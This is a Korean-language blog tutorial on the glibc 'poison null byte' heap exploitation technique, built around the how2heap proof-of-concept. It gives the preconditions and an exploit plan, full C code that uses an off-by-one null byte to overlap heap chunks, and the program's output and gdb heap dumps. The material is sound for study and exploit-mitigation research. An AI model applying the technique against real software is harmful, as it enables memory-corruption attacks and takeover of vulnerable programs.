---
title: Poison Null Byte
author: Beomsu Lee
category: [Exploitation, Heap]
tags: [exploitation, heap, poison null byte]
math: true
mermaid: true
---

## Conditions

- 공격자에 의해 다음과 같은 heap 영역을 할당, 해제할 수 있어야 함
    - 0x200 이상의 heap 영역
    - fast bin 이상의 heap 영역(heap size : 0x80 이상)
- 공격자에 의해 free chunk의 size 영역에 1byte를 Null로 변경할 수 있어야 함
- 공격자에 의해 free chunk의 size보다 작은 heap 영역을 2개 할당할 수 있어야 하며 fast chunk는 사용할 수 없음

## Exploit plan

1. 3개의 heap 영역 할당(heap1, heap2, heap3)
2. heap2 영역(heap2 주소 + heap2 size(null로 변조한 heap size))에 1byte를 null로 변조한 값을 저장
3. heap2 영역 해제
4. free chunk의 size 영역에 1byte를 null로 변조
5. 변경된 free chunk 영역 안에서 생성 가능한 크기의 heap 영역 2개 할당(heap4, heap5)
6. heap4 영역 해제
7. heap3 영역 해제
8. "heap4 + heap5" 이상의 heap 영역 할당
    - 할당 받은 영역으로 인해 heap5 영역의 값을 덮어쓸 수 있음

## Proof of concept

```c
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <stdint.h>
#include <malloc.h>

int main()
{
    fprintf(stderr, "Welcome to poison null byte 2.0!\n");
    fprintf(stderr, "Tested in Ubuntu 14.04 64bit.\n");
    fprintf(stderr, "This technique only works with disabled tcache-option for glibc, see build_glibc.sh for build instructions.\n");
    fprintf(stderr, "This technique can be used when you have an off-by-one into a malloc'ed region with a null byte.\n");

    uint8_t* a;
    uint8_t* b;
    uint8_t* c;
    uint8_t* b1;
    uint8_t* b2;
    uint8_t* d;
    void *barrier;

    fprintf(stderr, "We allocate 0x100 bytes for 'a'.\n");
    a = (uint8_t*) malloc(0x100);
    fprintf(stderr, "a: %p\n", a);
    int real_a_size = malloc_usable_size(a);
    fprintf(stderr, "Since we want to overflow 'a', we need to know the 'real' size of 'a' "
        "(it may be more than 0x100 because of rounding): %#x\n", real_a_size);

    /* chunk size attribute cannot have a least significant byte with a value of 0x00.
     * the least significant byte of this will be 0x10, because the size of the chunk includes
     * the amount requested plus some amount required for the metadata. */
    b = (uint8_t*) malloc(0x200);

    fprintf(stderr, "b: %p\n", b);

    c = (uint8_t*) malloc(0x100);
    fprintf(stderr, "c: %p\n", c);

    barrier =  malloc(0x100);
    fprintf(stderr, "We allocate a barrier at %p, so that c is not consolidated with the top-chunk when freed.\n"
        "The barrier is not strictly necessary, but makes things less confusing\n", barrier);

    uint64_t* b_size_ptr = (uint64_t*)(b - 8);

    // added fix for size==prev_size(next_chunk) check in newer versions of glibc
    // https://sourceware.org/git/?p=glibc.git;a=commitdiff;h=17f487b7afa7cd6c316040f3e6c86dc96b2eec30
    // this added check requires we are allowed to have null pointers in b (not just a c string)
    //*(size_t*)(b+0x1f0) = 0x200;
    fprintf(stderr, "In newer versions of glibc we will need to have our updated size inside b itself to pass "
        "the check 'chunksize(P) != prev_size (next_chunk(P))'\n");
    // we set this location to 0x200 since 0x200 == (0x211 & 0xff00)
    // which is the value of b.size after its first byte has been overwritten with a NULL byte
    *(size_t*)(b+0x1f0) = 0x200;

    // this technique works by overwriting the size metadata of a free chunk
    free(b);
    
    fprintf(stderr, "b.size: %#lx\n", *b_size_ptr);
    fprintf(stderr, "b.size is: (0x200 + 0x10) | prev_in_use\n");
    fprintf(stderr, "We overflow 'a' with a single null byte into the metadata of 'b'\n");
    a[real_a_size] = 0; // <--- THIS IS THE "EXPLOITED BUG"
    fprintf(stderr, "b.size: %#lx\n", *b_size_ptr);

    uint64_t* c_prev_size_ptr = ((uint64_t*)c)-2;
    fprintf(stderr, "c.prev_size is %#lx\n",*c_prev_size_ptr);

    // This malloc will result in a call to unlink on the chunk where b was.
    // The added check (commit id: 17f487b), if not properly handled as we did before,
    // will detect the heap corruption now.
    // The check is this: chunksize(P) != prev_size (next_chunk(P)) where
    // P == b-0x10, chunksize(P) == *(b-0x10+0x8) == 0x200 (was 0x210 before the overflow)
    // next_chunk(P) == b-0x10+0x200 == b+0x1f0
    // prev_size (next_chunk(P)) == *(b+0x1f0) == 0x200
    fprintf(stderr, "We will pass the check since chunksize(P) == %#lx == %#lx == prev_size (next_chunk(P))\n",
        *((size_t*)(b-0x8)), *(size_t*)(b-0x10 + *((size_t*)(b-0x8))));
    b1 = malloc(0x100);

    fprintf(stderr, "b1: %p\n",b1);
    fprintf(stderr, "Now we malloc 'b1'. It will be placed where 'b' was. "
        "At this point c.prev_size should have been updated, but it was not: %#lx\n",*c_prev_size_ptr);
    fprintf(stderr, "Interestingly, the updated value of c.prev_size has been written 0x10 bytes "
        "before c.prev_size: %lx\n",*(((uint64_t*)c)-4));
    fprintf(stderr, "We malloc 'b2', our 'victim' chunk.\n");
    // Typically b2 (the victim) will be a structure with valuable pointers that we want to control

    b2 = malloc(0x80);
    fprintf(stderr, "b2: %p\n",b2);

    memset(b2,'B',0x80);
    fprintf(stderr, "Current b2 content:\n%s\n",b2);

    fprintf(stderr, "Now we free 'b1' and 'c': this will consolidate the chunks 'b1' and 'c' (forgetting about 'b2').\n");

    free(b1);
    free(c);
    
    fprintf(stderr, "Finally, we allocate 'd', overlapping 'b2'.\n");
    d = malloc(0x300);
    fprintf(stderr, "d: %p\n",d);
    
    fprintf(stderr, "Now 'd' and 'b2' overlap.\n");
    memset(d,'D',0x300);

    fprintf(stderr, "New b2 content:\n%s\n",b2);

    fprintf(stderr, "Thanks to https://www.contextis.com/resources/white-papers/glibc-adventures-the-forgotten-chunks"
        "for the clear explanation of this technique.\n");
}
```

a(0x100), b(0x200), c(0x100) heap 영역 할당한다.

```
Welcome to poison null byte 2.0!
Tested in Ubuntu 14.04 64bit.
This technique only works with disabled tcache-option for glibc, see build_glibc.sh for build instructions.
This technique can be used when you have an off-by-one into a malloc'ed region with a null byte.
We allocate 0x100 bytes for 'a'.
a: 0x603010
Since we want to overflow 'a', we need to know the 'real' size of 'a' (it may be more than 0x100 because of rounding): 0x108
b: 0x603120
c: 0x603330
```

top chunk와 병합되지 않도록 barrier heap 영역 할당한다.

```
We allocate a barrier at 0x603440, so that c is not consolidated with the top-chunk when freed.
The barrier is not strictly necessary, but makes things less confusing
```

b + 0x200 위치에 0x200(heap) 저장한다. * 0x603110 + 0x200 = 0x603310

```
In newer versions of glibc we will need to have our updated size inside b itself to pass the check 'chunksize(P) != prev_size (next_chunk(P))'
```

```
gdb-peda$ p 0x603110 + 0x200
$1 = 0x603310
gdb-peda$ x/24gx 0x603310
0x603310:   0x0000000000000200  0x0000000000000000
```

off-by-one을 통해 b의 size 변조한다.

```
b.size: 0x211
b.size is: (0x200 + 0x10) | prev_in_use
We overflow 'a' with a single null byte into the metadata of 'b'
b.size: 0x200
c.prev_size is 0x210
```

b1을 0x100 할당 시 b영역에 재할당(0x603110)한다. b2를 0x80 만큼 할당 시 b영역에 재할당(0x603110 + 0x110)한다. b2에 memset을 통해 ‘B’ 저장한다.

```
We will pass the check since chunksize(P) == 0x200 == 0x200 == prev_size (next_chunk(P))
b1: 0x603120
Now we malloc 'b1'. It will be placed where 'b' was. At this point c.prev_size should have been updated, but it was not: 0x210
Interestingly, the updated value of c.prev_size has been written 0x10 bytes before c.prev_size: f0
We malloc 'b2', our 'victim' chunk.
b2: 0x603230
Current b2 content:
BBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBB
```

b1을 free한다. c를 free하면 c의 prev_size를 확인하는데 이 때 0x210으로 되어 있어 "c - 0x210" 위치를 확인하여 free chunk인지 확인한다. b1을 free 했기 때문에 free 영역으로 인식하여 b1과 c를 병합하게 된다.

```
Now we free 'b1' and 'c': this will consolidate the chunks 'b1' and 'c' (forgetting about 'b2').
```

b1과 c가 병합(0x603110)되어 0x320이 되었다.

```
gdb-peda$ parseheap
addr                prev                size                 status              fd                bk                
0x603000            0x0                 0x110                Used                None              None
0x603110            0x0                 0x320                Freed           0x6032b0    0x7ffff7dd1b78
0x603430            0x320               0x110                Used                None              None
```

새로 할당한 d와 b2가 overlapping 된다. d를 ’D’로 memset 한 후 b2를 확인하면 ’D’로 저장되있는 것을 확인할 수 있다.

```
Finally, we allocate 'd', overlapping 'b2'.
d: 0x603120
Now 'd' and 'b2' overlap.
New b2 content:
DDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDD
Thanks to https://www.contextis.com/resources/white-papers/glibc-adventures-the-forgotten-chunksfor the clear explanation of this technique.
```

## References

- [Poison null byte](https://www.lazenca.net/display/TEC/Poison+null+byte)
- [(how2heap) - posion null byte](https://code1018.tistory.com/220)